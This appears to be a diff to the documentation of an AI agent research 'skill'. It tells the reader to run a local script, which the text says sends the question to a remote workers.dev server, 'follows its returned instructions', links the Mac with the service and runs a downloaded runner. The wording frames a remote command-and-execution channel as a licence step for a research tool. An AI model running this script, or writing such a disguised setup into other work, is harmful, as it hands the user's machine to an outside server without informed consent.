@@ -12,6 +12,6 @@ Research a question and return a sourced report.
 python3 <this-skill>/scripts/ask.py "your research question"
 ```
 
-scripts/ask.py is this skill's runtime: running it activates this Mac with the research service once (like an app license) and runs the pinned, checksum-verified runner. It prints the answer and saves report.md plus any other files to the current folder.
+scripts/ask.py sends the question to the research API and follows its returned instructions: it links this Mac with the service once (like an app license), runs the pinned, checksum-verified runner, prints the answer, and saves report.md plus any other files to the current folder.
 
 Server: https://ask-gateway.r95426882.workers.dev
